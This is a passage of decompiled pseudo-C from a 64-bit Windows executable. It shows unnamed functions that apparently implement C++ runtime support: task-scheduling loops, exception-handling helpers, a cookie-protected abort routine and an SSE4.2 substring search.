      goto LABEL_19;
    }
    return sub_13F15DB44((__int64)a1, a2, *(_QWORD *)(*a1 + 120i64));
  }
  return v7;
}

//----- (000000013F15D820) ----------------------------------------------------
char __fastcall sub_13F15D820(__int64 a1, __int64 a2, __int64 a3, char a4)
{
  __int64 v7; // rax
  int i; // er15
  __int64 v9; // rbx
  __int64 v10; // rax
  int v11; // ecx
  __int64 v12; // xmm1_8
  __int128 v13; // xmm0
  char result; // al
  int v15; // [rsp+20h] [rbp-20h] BYREF
  __int128 v16; // [rsp+28h] [rbp-18h]
  __int64 v17; // [rsp+38h] [rbp-8h]

  v7 = sub_13F15C1E8(a3, &v15);
  for ( i = v15; ; v7 = sub_13F149F2C(a3, &v15, i, a3 + 160) )
  {
    v9 = v7;
    if ( !v7 )
      break;
    if ( a4 )
    {
      v10 = sub_13F158EF8(v7);
      if ( v10 )
      {
        LODWORD(v16) = 2;
        v17 = v10;
LABEL_6:
        v11 = *(_DWORD *)(a3 + 272);
        v12 = v17;
        *((_QWORD *)&v16 + 1) = v9;
        v13 = v16;
        result = 1;
        *(_DWORD *)(a3 + 292) = (v15 + 1) % v11;
        *(_OWORD *)a2 = v13;
        *(_QWORD *)(a2 + 16) = v12;
        return result;
      }
    }
    else if ( sub_13F158F64(v7) )
    {
      LODWORD(v16) = 8;
      goto LABEL_6;
    }
  }
  return 0;
}

//----- (000000013F15D8F0) ----------------------------------------------------
char __fastcall sub_13F15D8F0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rax
  int i; // edi
  __int64 v7; // r8
  char result; // al
  __int64 v9; // rax
  __int64 v10; // xmm1_8
  char v11[40]; // [rsp+20h] [rbp-28h] BYREF
  int v12; // [rsp+68h] [rbp+20h] BYREF

  v5 = sub_13F15C1E8(a3, &v12);
  for ( i = v12; ; v5 = sub_13F149F2C(a3, &v12, i, a3 + 160) )
  {
    if ( !v5 )
      return 0;
    v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 24i64))(v5);
    if ( v7 )
      break;
  }
  *(_DWORD *)(a3 + 292) = (v12 + 1) % *(_DWORD *)(a3 + 272);
  v9 = sub_13F15BFE4((__int64)v11, v7);
  *(_OWORD *)a2 = *(_OWORD *)v9;
  v10 = *(_QWORD *)(v9 + 16);
  result = 1;
  *(_QWORD *)(a2 + 16) = v10;
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F15D8F0: using guessed type char var_28[40];

//----- (000000013F15D998) ----------------------------------------------------
char __fastcall sub_13F15D998(__int64 a1, __int64 a2, __int64 a3, char a4)
{
  __int64 v7; // rax
  int i; // er15
  __int64 v9; // rbx
  __int64 v10; // r8
  int v11; // ecx
  __int128 v12; // xmm0
  char result; // al
  int v14; // [rsp+20h] [rbp-20h] BYREF
  __int128 v15; // [rsp+28h] [rbp-18h]
  __int64 v16; // [rsp+38h] [rbp-8h]

  v7 = sub_13F15C1E8(a3, &v14);
  for ( i = v14; ; v7 = sub_13F149F2C(a3, &v14, i, a3 + 160) )
  {
    v9 = v7;
    if ( !v7 )
      break;
    if ( a4 )
    {
      v10 = sub_13F1598F8(v7, 0);
      if ( v10 )
      {
        LODWORD(v15) = 4;
LABEL_6:
        v11 = *(_DWORD *)(a3 + 272);
        *((_QWORD *)&v15 + 1) = v9;
        v12 = v15;
        v16 = v10;
        result = 1;
        *(_DWORD *)(a3 + 292) = (v14 + 1) % v11;
        *(_OWORD *)a2 = v12;
        *(_QWORD *)(a2 + 16) = v10;
        return result;
      }
    }
    else
    {
      v10 = sub_13F159318(v7);
      if ( v10 )
      {
        LODWORD(v15) = 16;
        goto LABEL_6;
      }
    }
  }
  return 0;
}

//----- (000000013F15DA6C) ----------------------------------------------------
char __fastcall sub_13F15DA6C(_QWORD *a1, __int64 a2, __int64 a3, int a4, char a5)
{
  char v8; // bl
  _DWORD *v9; // rdx
  int v10; // er9
  __int64 v11; // r10
  int v12; // eax
  unsigned int v13; // er9
  unsigned int v14; // er8
  __int64 v15; // rdx
  bool v16; // zf

  if ( a2 == a3 )
    return 1;
  v8 = 0;
  v9 = (_DWORD *)(a2 + 24);
  if ( !a4 )
    return (*v9 & 0xFFFFFFF) != 0;
  v10 = a4 - 1;
  if ( v10 )
  {
    if ( v10 != 1 )
      return v8;
    if ( (*v9 & 0xFFFFFFF) == 0 || sub_13F15BF9C(*a1 + 216i64, v9) )
      return 1;
    v11 = a1[1];
    v12 = 0;
    v13 = 0;
    v14 = (unsigned int)(*(_DWORD *)(v11 + 96) + 31) >> 5;
    if ( !v14 )
      return v8;
    while ( !v12 )
    {
      v15 = v13++;
      v12 = *(_DWORD *)(*(_QWORD *)(v11 + 104) + 4 * v15) & *(_DWORD *)(*(_QWORD *)(a2 + 56) + 4 * v15);
      if ( v13 >= v14 )
      {
        if ( !v12 )
          return v8;
        break;
      }
    }
    v16 = a5 == 0;
  }
  else
  {
    if ( (*v9 & 0xFFFFFFF) == 0 )
      return 1;
    v16 = !sub_13F15BF9C(*a1 + 216i64, v9);
  }
  if ( v16 )
    return 1;
  return v8;
}

//----- (000000013F15DB44) ----------------------------------------------------
char __fastcall sub_13F15DB44(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r11
  int v4; // ebx
  int v5; // er9
  int v9; // er10
  int v10; // edx
  __int64 v11; // r8
  __int64 v12; // r11
  int v13; // er9
  int v14; // er10

  v3 = *(_QWORD *)(a1 + 8);
  v4 = 0;
  v5 = 0;
  v9 = *(_DWORD *)(v3 + 68);
  if ( v9 <= 0 )
    goto LABEL_5;
  while ( 1 )
  {
    v10 = v5 % v9;
    if ( v5 % v9 == -1 )
      return 0;
    v11 = *(_QWORD *)(*(_QWORD *)(v3 + 48) + 8i64 * v10);
    if ( v11 )
    {
LABEL_14:
      v4 = v10;
      goto LABEL_6;
    }
    if ( ++v5 >= v9 )
    {
LABEL_5:
      while ( 1 )
      {
        v11 = 0i64;
LABEL_6:
        if ( !v11 )
          return 0;
        if ( v11 != a3 && sub_13F15DC1C(a1, a2, v11, 0i64) )
          return 1;
        v12 = *(_QWORD *)(a1 + 8);
        v13 = 0;
        v14 = *(_DWORD *)(v12 + 68);
        if ( v14 > 0 )
        {
          while ( 1 )
          {
            v10 = (v13 + v4 + 1) % v14;
            if ( !v10 )
              return 0;
            v11 = *(_QWORD *)(*(_QWORD *)(v12 + 48) + 8i64 * v10);
            if ( v11 )
              goto LABEL_14;
            if ( ++v13 >= v14 )
              goto LABEL_5;
          }
        }
      }
    }
  }
}

//----- (000000013F15DC1C) ----------------------------------------------------
char __fastcall sub_13F15DC1C(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  int v6; // er8
  int v7; // edx
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // xmm1_8
  char v14[40]; // [rsp+20h] [rbp-28h] BYREF
  int v15; // [rsp+60h] [rbp+18h] BYREF

  v6 = *(_DWORD *)(a3 + 192);
  v7 = 0;
LABEL_2:
  v10 = sub_13F1496EC(a3, v7, v6, &v15);
  if ( v10 )
  {
    while ( 1 )
    {
      if ( v10 != a4 )
      {
        if ( (unsigned int)*(_QWORD *)(a1 + 24) - *(_DWORD *)(v10 + 312) > 0x64 )
          *(_QWORD *)(v10 + 312) = *(_QWORD *)(a1 + 24);
        v11 = sub_13F15DCE0(v10);
        if ( v11 )
          break;
      }
      v7 = v15 + 1;
      if ( v15 + 1 > 0 )
      {
        v10 = sub_13F1496EC(a3, v7, *(_DWORD *)(a3 + 192), &v15);
        v7 = 0;
        if ( v10 )
          continue;
      }
      v6 = 0;
      goto LABEL_2;
    }
    v10 = sub_13F15BFE4((__int64)v14, v11);
    *(_OWORD *)a2 = *(_OWORD *)v10;
    v12 = *(_QWORD *)(v10 + 16);
    LOBYTE(v10) = 1;
    *(_QWORD *)(a2 + 16) = v12;
  }
  return v10;
}
// 13F15DC1C: using guessed type char var_28[40];

//----- (000000013F15DCE0) ----------------------------------------------------
__int64 __fastcall sub_13F15DCE0(__int64 a1)
{
  __int64 v1; // rsi
  int *v2; // rdi
  volatile __int32 *v3; // rbx

  v1 = 0i64;
  v2 = (int *)(a1 + 24);
  if ( *(_DWORD *)(a1 + 28) > *(_DWORD *)(a1 + 24) )
  {
    v3 = *(volatile __int32 **)(a1 + 56);
    sub_13F142BD8(v3);
    v1 = sub_13F155B54(v2, 0);
    sub_13F142C20(v3);
  }
  return v1;
}

//----- (000000013F15DD44) ----------------------------------------------------
void __fastcall sub_13F15DD44(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rdx
  signed __int64 v6; // rdi
  __int64 v7; // rax
  char v8; // r8

  v4 = sub_13F102FD0(a2 + 16);
  v5 = *(_QWORD *)(a1 + 8);
  v6 = *(_QWORD *)(v4 + 424);
  v7 = *(_QWORD *)(v5 + 424);
  if ( *(_DWORD *)a1 != 2 )
  {
    if ( v6 == v7 )
      return;
    v8 = 1;
    goto LABEL_9;
  }
  if ( v6 != v7 )
  {
    v8 = 0;
LABEL_9:
    sub_13F1571C4(a2, v5, v8);
    return;
  }
  if ( (*(_BYTE *)(v6 + 80) & 4) == 0 && _InterlockedExchangeAdd((volatile signed __int32 *)(v6 + 40), 0xFFFFFFFF) == 1 )
  {
    (*(void (__fastcall **)(signed __int64))(*(_QWORD *)v6 + 56i64))(v6);
    sub_13F14B92C(*(_QWORD *)(v6 + 8), v6);
  }
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15DDD4) ----------------------------------------------------
__int64 __fastcall sub_13F15DDD4(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(a1 + 8))(*(_QWORD *)(a1 + 16));
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15DDE4) ----------------------------------------------------
_QWORD *__fastcall sub_13F15DDE4(_QWORD *a1, __int64 a2, __int64 a3)
{
  sub_13F1543A8((__int64)a1);
  *a1 = off_13F18C550;
  sub_13F1547C4((__int64)a1, a2, a3);
  return a1;
}
// 13F18C550: using guessed type __int64 (__fastcall *off_13F18C550[10])();

//----- (000000013F15DE3C) ----------------------------------------------------
_QWORD *__fastcall sub_13F15DE3C(_QWORD *a1, __int64 a2)
{
  char v2; // bl

  v2 = a2;
  *a1 = off_13F18C550;
  sub_13F15441C(a1, a2);
  if ( (v2 & 1) != 0 )
    sub_13F14088C(a1, 368i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18C550: using guessed type __int64 (__fastcall *off_13F18C550[10])();

//----- (000000013F15DE7C) ----------------------------------------------------
__int64 __fastcall sub_13F15DE7C(unsigned int *a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rax
  __int64 v6[4]; // [rsp+58h] [rbp-20h] BYREF

  v6[0] = (__int64)a1;
  v6[1] = a3;
  v4 = sub_13F15FC00();
  (*(void (__fastcall **)(_QWORD, __int64 *))(v4 + 16))(*a1, v6);
  return 0i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F15DE7C: using guessed type _QWORD var_20[4];

//----- (000000013F15DED0) ----------------------------------------------------
__int64 __fastcall sub_13F15DED0(__int64 a1, int a2)
{
  __int64 v2; // rbx
  __int64 v5; // rdx

  LODWORD(v2) = *(_DWORD *)(a1 + 12);
  while ( (_DWORD)v2 )
  {
    v2 = (unsigned int)(v2 - 1);
    v5 = *(int *)(a1 + 16) + *(_QWORD *)(sub_13F15FC00() + 96) + 20 * v2;
    if ( a2 > *(_DWORD *)(v5 + 4) && a2 <= *(_DWORD *)(v5 + 8) )
      return v5;
  }
  return 0i64;
}

//----- (000000013F15DF28) ----------------------------------------------------
bool __fastcall sub_13F15DF28(unsigned __int64 *a1, __int64 a2)
{
  int v3; // eax

  v3 = sub_13F15FE4C(a2, a1);
  return sub_13F15DED0(a2, v3) != 0;
}

//----- (000000013F15DF54) ----------------------------------------------------
__int64 __fastcall sub_13F15DF54(_QWORD *a1, unsigned __int64 *a2, __int64 a3)
{
  __int64 *v5; // rsi
  int v6; // eax
  __int64 v7; // rax
  int v8; // er9
  __int64 v10; // [rsp+48h] [rbp+20h] BYREF

  v5 = sub_13F15DFB8(a1, a2, a3, &v10);
  v6 = sub_13F15FE4C(a3, a2);
  v7 = sub_13F15DED0(a3, v6);
  if ( v7 )
    v8 = *(_DWORD *)(v7 + 4);
  else
    v8 = -1;
  return sub_13F160F40(v5, a2, a3, v8);
}

//----- (000000013F15DFB8) ----------------------------------------------------
_QWORD *__fastcall sub_13F15DFB8(_QWORD *a1, unsigned __int64 *a2, __int64 a3, _QWORD *a4)
{
  __int64 v4; // rdi
  int v9; // ebp
  _DWORD *v10; // rbx
  unsigned int *v11; // rax
  __int64 v12; // rcx
  __int64 v13; // r8
  unsigned int v14; // er9
  _DWORD *v15; // rdx
  __int64 v17; // [rsp+50h] [rbp+8h] BYREF

  LODWORD(v4) = *(_DWORD *)(a3 + 12);
  v9 = sub_13F15FE4C(a3, a2);
  *a4 = *a1;
  while ( (_DWORD)v4 )
  {
    v4 = (unsigned int)(v4 - 1);
    v10 = (_DWORD *)(a2[1] + *(int *)(a3 + 16) + 20 * v4);
    if ( v9 > v10[1] && v9 <= v10[2] )
    {
      v11 = (unsigned int *)MEMORY[0x76FBBAB0](*a2, &v17, 0i64);
      v12 = 0i64;
      v13 = v17 + (int)v10[4];
      v14 = v10[3];
      if ( v14 )
      {
        v15 = (_DWORD *)(v13 + 12);
        do
        {
          if ( *v15 == (unsigned __int64)*v11 )
            break;
          v12 = (unsigned int)(v12 + 1);
          v15 += 5;
        }
        while ( (unsigned int)v12 < v14 );
      }
      if ( (unsigned int)v12 < v14 )
      {
        *a4 = *(_QWORD *)(*(int *)(v13 + 20 * v12 + 16) + *a1);
        return a4;
      }
    }
  }
  return a4;
}

//----- (000000013F15E084) ----------------------------------------------------
_OWORD *__fastcall sub_13F15E084(_OWORD *a1, __int64 *a2, int a3)
{
  __int64 v3; // rsi
  unsigned __int64 *v5; // rbp
  int v6; // ebx
  unsigned __int64 v7; // rdi
  unsigned int v8; // er14
  int v9; // er15
  unsigned __int64 v10; // r9
  __int64 v11; // r10
  int v12; // er8
  unsigned int v13; // edx
  __int64 v14; // r11
  unsigned __int64 v15; // rax
  unsigned int v16; // edx
  _DWORD *v17; // rcx
  int v18; // eax
  int v19; // eax
  _OWORD *result; // rax
  __int128 v21; // [rsp+20h] [rbp-58h]
  __int128 v22; // [rsp+30h] [rbp-48h]
  int v24; // [rsp+88h] [rbp+10h]

  v3 = *a2;
  v5 = (unsigned __int64 *)a2[1];
  v6 = 0;
  v7 = 0i64;
  v8 = *(_DWORD *)(*a2 + 12);
  v9 = sub_13F15FE4C(*a2, v5);
  if ( !v8 )
    sub_13F16A158();
  v10 = v5[1];
  v11 = *(int *)(v3 + 16);
  v12 = -1;
  v24 = -1;
  v13 = v8;
  do
  {
    v14 = v13 - 1;
    v15 = v10 + 20 * v14;
    if ( v9 > *(_DWORD *)(v15 + v11 + 4) && v9 <= *(_DWORD *)(v15 + v11 + 8) )
      break;
    --v13;
  }
  while ( (_DWORD)v14 );
  if ( v13 )
    v7 = v10 + v11 + 20i64 * (v13 - 1);
  v16 = 0;
  v17 = (_DWORD *)(v10 + v11);
  do
  {
    if ( (!v7 || *v17 > *(_DWORD *)(v7 + 4) && v17[1] <= *(_DWORD *)(v7 + 8)) && a3 >= *v17 && a3 <= v17[1] )
    {
      v24 = v16;
      v18 = v16;
      if ( v12 != -1 )
        v18 = v12;
      v12 = v18;
    }
    ++v16;
    v17 += 5;
  }
  while ( v16 < v8 );
  v19 = 0;
  *(_QWORD *)&v21 = a2;
  *(_QWORD *)&v22 = a2;
  if ( v12 != -1 )
    v19 = v12;
  DWORD2(v21) = v19;
  *a1 = v21;
  if ( v12 != -1 )
    v6 = v24 + 1;
  result = a1;
  DWORD2(v22) = v6;
  a1[1] = v22;
  return result;
}
// 13F15E11F: conditional instruction was optimized away because er14.4!=0
// 13F15E1A4: variable 'v21' is possibly undefined
// 13F15E1C1: variable 'v22' is possibly undefined

//----- (000000013F15E1E0) ----------------------------------------------------
__int64 __fastcall sub_13F15E1E0(
        __int64 *a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        int a7,
        int a8,
        int a9,
        __int64 *a10,
        unsigned __int8 a11)
{
  __int128 v11; // xmm1
  __int128 v12; // xmm0
  __int128 v13; // xmm1
  __int128 v14; // xmm0
  __int128 v15; // xmm1
  __int128 v16; // xmm0
  __int128 v17; // xmm1
  __int64 v18; // rax
  __int64 v19; // rcx
  __int64 v20; // rdx
  __int64 v22; // [rsp+28h] [rbp-D8h]
  __int128 v23[2]; // [rsp+30h] [rbp-D0h] BYREF
  __int128 v24; // [rsp+50h] [rbp-B0h]
  __int128 v25; // [rsp+60h] [rbp-A0h]
  __int128 v26; // [rsp+70h] [rbp-90h]
  __int128 v27; // [rsp+80h] [rbp-80h]
  __int128 v28; // [rsp+90h] [rbp-70h]
  __int128 v29; // [rsp+A0h] [rbp-60h]
  __int128 v30; // [rsp+B0h] [rbp-50h]
  __int64 v31; // [rsp+C0h] [rbp-40h]
  char v32[1232]; // [rsp+D0h] [rbp-30h] BYREF

  v11 = *(_OWORD *)&qword_13F18C5A0[2];
  v23[0] = *(_OWORD *)qword_13F18C5A0;
  v12 = *(_OWORD *)&qword_13F18C5A0[4];
  v23[1] = v11;
  v13 = *(_OWORD *)&qword_13F18C5A0[6];
  v24 = v12;
  v14 = *(_OWORD *)&qword_13F18C5A0[8];
  v25 = v13;
  v15 = *(_OWORD *)&qword_13F18C5A0[10];
  v26 = v14;
  v16 = *(_OWORD *)&qword_13F18C5A0[12];
  v27 = v15;
  v17 = *(_OWORD *)&qword_13F18C5A0[16];
  v28 = v16;
  v18 = qword_13F18C5A0[18];
  v29 = *(_OWORD *)&qword_13F18C5A0[14];
  v30 = v17;
  v31 = v18;
  v19 = *a1;
  *(_QWORD *)&v24 = sub_13F160CCC;
  *(_QWORD *)&v25 = a5;
  *((_QWORD *)&v25 + 1) = a7;
  *((_QWORD *)&v26 + 1) = a6;
  *((_QWORD *)&v27 + 1) = a11;
  v22 = a10[8];
  *((_QWORD *)&v24 + 1) = a4;
  *(_QWORD *)&v26 = a3;
  *(_QWORD *)&v27 = a2;
  v20 = *a10;
  *(_QWORD *)&v28 = 429065504i64;
  return MEMORY[0x76FA0510](v19, v20, v23, 0i64, v32, v22);
}
// 13F18C5A0: using guessed type __int64 qword_13F18C5A0[3];
// 13F15E1E0: using guessed type _OWORD var_580[2];
// 13F15E1E0: using guessed type char var_4E0[1232];

//----- (000000013F15E304) ----------------------------------------------------
_QWORD *__fastcall sub_13F15E304(_QWORD *a1, __int64 a2)
{
  __int64 v3; // rcx

  *a1 = a2;
  if ( (unsigned __int64)a1 >= *(_QWORD *)(sub_13F15FC00() + 88) )
    v3 = 0i64;
  else
    v3 = *(_QWORD *)(sub_13F15FC00() + 88);
  a1[1] = v3;
  *(_QWORD *)(sub_13F15FC00() + 88) = a1;
  return a1;
}

//----- (000000013F15E340) ----------------------------------------------------
__int64 __fastcall sub_13F15E340(__int64 a1)
{
  __int64 i; // rdx
  __int64 *v3; // rbx
  __int64 result; // rax

  if ( a1 != *(_QWORD *)(sub_13F15FC00() + 88) )
LABEL_8:
    sub_13F16A158();
  for ( i = *(_QWORD *)(sub_13F15FC00() + 88); ; i = *v3 )
  {
    if ( !i )
      goto LABEL_8;
    v3 = (__int64 *)(i + 8);
    if ( a1 == i )
      break;
  }
  result = sub_13F15FC00();
  *(_QWORD *)(result + 88) = *v3;
  return result;
}

//----- (000000013F15E394) ----------------------------------------------------
__int64 sub_13F15E394()
{
  return *(_QWORD *)(sub_13F15FC00() + 96);
}

//----- (000000013F15E3A8) ----------------------------------------------------
__int64 sub_13F15E3A8()
{
  return *(_QWORD *)(sub_13F15FC00() + 104);
}

//----- (000000013F15E3BC) ----------------------------------------------------
__int64 __fastcall sub_13F15E3BC(__int64 a1)
{
  __int64 result; // rax

  result = sub_13F15FC00();
  *(_QWORD *)(result + 96) = a1;
  return result;
}

//----- (000000013F15E3D4) ----------------------------------------------------
__int64 __fastcall sub_13F15E3D4(__int64 a1)
{
  __int64 result; // rax

  result = sub_13F15FC00();
  *(_QWORD *)(result + 104) = a1;
  return result;
}

//----- (000000013F15E46C) ----------------------------------------------------
__int64 __fastcall sub_13F15E46C(__int64 a1, __int64 a2)
{
  __int64 v4; // rdi
  _BYTE *v5; // rax
  _BYTE *v6; // rbx
  __int64 result; // rax

  if ( *(_BYTE *)(a1 + 8) && *(_QWORD *)a1 )
  {
    v4 = -1i64;
    do
      ++v4;
    while ( *(_BYTE *)(*(_QWORD *)a1 + v4) );
    v5 = (_BYTE *)sub_13F16A298(v4 + 1);
    v6 = v5;
    if ( v5 )
    {
      sub_13F16DD4C(v5, v4 + 1, *(_QWORD *)a1);
      *(_BYTE *)(a2 + 8) = 1;
      *(_QWORD *)a2 = v6;
      v6 = 0i64;
    }
    return sub_13F16A188(v6);
  }
  else
  {
    result = *(_QWORD *)a1;
    *(_QWORD *)a2 = *(_QWORD *)a1;
    *(_BYTE *)(a2 + 8) = 0;
  }
  return result;
}
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);
// 13F16A298: using guessed type __int64 __fastcall sub_13F16A298(_QWORD);

//----- (000000013F15E4FC) ----------------------------------------------------
__int64 __fastcall sub_13F15E4FC(__int64 a1)
{
  __int64 result; // rax

  if ( *(_BYTE *)(a1 + 8) )
    result = sub_13F16A188(*(_QWORD *)a1);
  *(_QWORD *)a1 = 0i64;
  *(_BYTE *)(a1 + 8) = 0;
  return result;
}
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);

//----- (000000013F15E52C) ----------------------------------------------------
__int64 __fastcall sub_13F15E52C(__int64 a1, __int64 a2)
{
  char *v2; // rax
  __int64 v3; // rdx
  char v4; // cl

  if ( a1 == a2 )
    return 0i64;
  v2 = (char *)(a1 + 9);
  v3 = a2 - a1;
  while ( 1 )
  {
    v4 = *v2;
    if ( *v2 != v2[v3] )
      break;
    ++v2;
    if ( !v4 )
      return 0i64;
  }
  return (unsigned __int8)*v2 < (unsigned __int8)v2[v3] ? -1 : 1;
}

//----- (000000013F15E554) ----------------------------------------------------
signed __int64 __fastcall sub_13F15E554(__int64 a1, __int64 a2)
{
  signed __int64 result; // rax
  signed __int64 v5; // rsi
  char *v6; // rbx
  __int64 v7; // rax
  __int64 v8; // rbp
  __int64 v9; // rax
  __int64 v10; // rdi
  __int64 v11; // r12
  signed __int64 v12; // r15
  signed __int64 v13; // rax

  result = *(_QWORD *)a1;
  v5 = 0i64;
  if ( !*(_QWORD *)a1 )
  {
    v6 = sub_13F167778(0i64, (char *)(a1 + 9), 0, (__int64 (__fastcall *)())sub_13F15E524, sub_13F12E550, 0x2800u);
    if ( v6 )
    {
      v7 = -1i64;
      do
        ++v7;
      while ( v6[v7] );
      for ( ; v7; v6[--v7] = 0 )
      {
        if ( v6[v7 - 1] != 32 )
          break;
      }
      v8 = v7 + 1;
      v9 = sub_13F16A298(v7 + 17);
      v10 = v9;
      if ( v9 )
      {
        v11 = v9;
        v12 = v9 + 16;
        *(_OWORD *)v9 = 0ui64;
        sub_13F16DD4C((_BYTE *)(v9 + 16), v8, (__int64)v6);
        v13 = _InterlockedCompareExchange64((volatile signed __int64 *)a1, v12, 0i64);
        if ( v13 )
        {
          v5 = v13;
        }
        else
        {
          v10 = 0i64;
          MEMORY[0x771C4CC0](a2, v11);
          v5 = v12;
        }
      }
      sub_13F16A188(v10);
    }
    sub_13F16A188(v6);
    return v5;
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F15E524: using guessed type __int64 __fastcall sub_13F15E524(_QWORD);
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);
// 13F16A298: using guessed type __int64 __fastcall sub_13F16A298(_QWORD);

//----- (000000013F15E670) ----------------------------------------------------
void __noreturn sub_13F15E670()
{
  void (*v0)(void); // rax

  v0 = (void (*)(void))__ROR8__(_security_cookie ^ 0x2CC5EF7154DEi64, _security_cookie & 0x3F);
  if ( v0 )
    v0();
  sub_13F16DDAC();
}
// 13F15E670: using guessed type void __fastcall __noreturn sub_13F15E670();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5FD8: using guessed type __int64 qword_13F1C5FD8;

//----- (000000013F15E6A0) ----------------------------------------------------
void __fastcall sub_13F15E6A0(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rdx
  __int64 v3; // rcx

  if ( a1 )
  {
    if ( *(_DWORD *)a1 == -529697949
      && *(_DWORD *)(a1 + 24) == 4
      && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2 )
    {
      v1 = *(_QWORD *)(a1 + 48);
      if ( v1 )
      {
        v2 = *(int *)(v1 + 4);
        if ( (_DWORD)v2 )
        {
          ((void (__fastcall *)(_QWORD))(*(_QWORD *)(a1 + 56) + v2))(*(_QWORD *)(a1 + 40));
        }
        else if ( (*(_BYTE *)v1 & 0x10) != 0 )
        {
          v3 = **(_QWORD **)(a1 + 40);
          if ( v3 )
            (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 16i64))(v3);
        }
      }
    }
  }
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15E718) ----------------------------------------------------
__int64 __fastcall sub_13F15E718(__int64 a1)
{
  _QWORD *i; // rdx

  for ( i = *(_QWORD **)(sub_13F15FC00() + 88); ; i = (_QWORD *)i[1] )
  {
    if ( !i )
      return 1i64;
    if ( *i == a1 )
      break;
  }
  return 0i64;
}

//----- (000000013F15E748) ----------------------------------------------------
__int64 __fastcall sub_13F15E748(__int64 a1, int *a2)
{
  __int64 result; // rax

  result = a1 + *a2;
  if ( a2[1] >= 0 )
    result += a2[1] + (__int64)*(int *)(a2[2] + *(_QWORD *)(a2[1] + a1));
  return result;
}

//----- (000000013F15E76C) ----------------------------------------------------
__int64 __fastcall sub_13F15E76C(_DWORD **a1)
{
  _DWORD *v1; // rax
  __int64 v2; // rax

  v1 = *a1;
  if ( **a1 == -532462766 || *v1 == -532459699 )
  {
    if ( *(int *)(sub_13F15FC00() + 48) > 0 )
    {
      v2 = sub_13F15FC00();
      --*(_DWORD *)(v2 + 48);
    }
  }
  else if ( *v1 == -529697949 )
  {
    *(_DWORD *)(sub_13F15FC00() + 48) = 0;
    sub_13F16A158();
  }
  return 0i64;
}

//----- (000000013F15E7B8) ----------------------------------------------------
__int64 sub_13F15E7B8()
{
  return sub_13F15FC00() + 32;
}

//----- (000000013F15E7CC) ----------------------------------------------------
__int64 sub_13F15E7CC()
{
  return sub_13F15FC00() + 48;
}

//----- (000000013F15E7EC) ----------------------------------------------------
const __m128i *__fastcall sub_13F15E7EC(const __m128i *a1, const __m128i *a2)
{
  __int8 v2; // di
  const __m128i *v4; // r8
  __m128i inserted; // xmm0
  const __m128i *v7; // rcx
  __int8 v8; // dl
  __int64 v9; // r9
  __int8 v10; // si
  const __m128i *v11; // rax
  __m128i v12; // xmm1
  unsigned __int8 v13; // cf
  const __m128i *v14; // rdx
  const __m128i *i; // r9
  __m128i v16; // xmm1
  __m128i v17; // xmm2
  unsigned __int8 v18; // sf
  __int64 v19; // rax

  v2 = a2->m128i_i8[0];
  v4 = a1;
  if ( !a2->m128i_i8[0] )
    return a1;
  if ( ((unsigned __int16)a2 & 0xFFFu) > 0xFF0ui64 )
  {
    inserted = 0i64;
    v7 = a2;
    v8 = a2->m128i_i8[0];
    v9 = 16i64;
    do
    {
      v10 = v8;
      inserted = _mm_insert_epi8(_mm_srli_si128(inserted, 1), v8, 15);
      if ( v8 )
        v8 = v7->m128i_i8[1];
      v11 = (const __m128i *)&v7->m128i_i8[1];
      if ( !v10 )
        v11 = v7;
      v7 = v11;
      --v9;
    }
    while ( v9 );
  }
  else
  {
    inserted = _mm_loadu_si128(a2);
  }
  while ( 1 )
  {
    while ( ((unsigned __int16)v4 & 0xFFFu) > 0xFF0ui64 )
    {
      if ( !v4->m128i_i8[0] )
        return 0i64;
      if ( v4->m128i_i8[0] == v2 )
        goto LABEL_18;
LABEL_26:
      v4 = (const __m128i *)((char *)v4 + 1);
    }
    v12 = _mm_loadu_si128(v4);
    v13 = _mm_cmpistrc(inserted, v12, 12);
    if ( v13 | _mm_cmpistrz(inserted, v12, 12) )
      break;
    ++v4;
  }
  if ( v13 )
  {
    v4 = (const __m128i *)((char *)v4 + _mm_cmpistri(inserted, v12, 12));
LABEL_18:
    v14 = v4;
    for ( i = a2; ; i = (const __m128i *)((char *)i + v19) )
    {
      if ( ((unsigned __int16)v14 & 0xFFFu) > 0xFF0ui64 || ((unsigned __int16)i & 0xFFFu) > 0xFF0ui64 )
      {
        if ( !i->m128i_i8[0] )
          return v4;
        if ( v14->m128i_i8[0] != i->m128i_i8[0] )
          goto LABEL_26;
        v19 = 1i64;
      }
      else
      {
        v16 = _mm_loadu_si128(v14);
        v17 = _mm_loadu_si128(i);
        v18 = _mm_cmpistrs(v17, v16, 12);
        if ( !_mm_cmpistro(v17, v16, 12) )
          goto LABEL_26;
        if ( v18 )
          return v4;
        v19 = 16i64;
      }
      v14 = (const __m128i *)((char *)v14 + v19);
    }
  }
  return 0i64;
}
// 13F1B71A0: using guessed type int dword_13F1B71A0;

//----- (000000013F15E9EC) ----------------------------------------------------
